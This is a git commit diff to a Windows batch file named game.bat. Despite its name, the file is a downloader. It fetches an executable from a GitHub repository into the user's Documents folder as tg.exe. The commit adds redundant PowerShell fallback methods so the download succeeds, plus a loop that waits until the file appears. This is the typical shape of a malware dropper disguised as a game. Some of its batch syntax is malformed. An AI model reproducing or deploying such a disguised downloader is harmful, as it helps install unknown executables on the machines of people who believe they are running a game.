2561d7b8de45b3f53b3edd415c5722d078fed39d
neginsadeghi2005 <nedaa.sadeghi.1997@gmail.com>
2025-03-08 15:55:10 +0330

    Update game.bat

--- game.bat
+++ game.bat
@@ -1,9 +1,15 @@
 for /f "tokens=2 delims=\" %%i in ('whoami') do set "user=%%i"
-PowerShell -Command "$webClient = New-Object System.Net.WebClient; $webClient.DownloadFile('https://github.com/neginsadeghi2005/project/raw/refs/heads/main/result.exe' , 'C:\Users\%user%\Documents\tg.exe')"
 
+PowerShell -Command "$webClient = New-Object System.Net.WebClient; $webClient.DownloadFile('https://github.com/neginsadeghi2005/project/raw/refs/heads/main/result.exe' , 'C:\Users\%user%\Documents\tg.exe')"
+if ERRORLEVEL 1 (
+	PowerShell -Command "Invoke-RestMethod -Uri 'https://github.com/neginsadeghi2005/project/raw/refs/heads/main/result.exe' -OutFile 'C:\Users\%user%\Documents\tg.exe'"
+	if ERRORLEVEL 1 ( 
+		PowerShell -Command "Invoke-WebRequest -Uri 'https://github.com/neginsadeghi2005/project/raw/refs/heads/main/result.exe' -OutFile 'C:\Users\%user%\Documents\tg.exe'"
+	)
 :check
 	if "C:\Users\%user%\Documents\tg.exe" exist (
 	
 	) else ( 
+		timeout /t 1 >nul
 		goto check
 	)
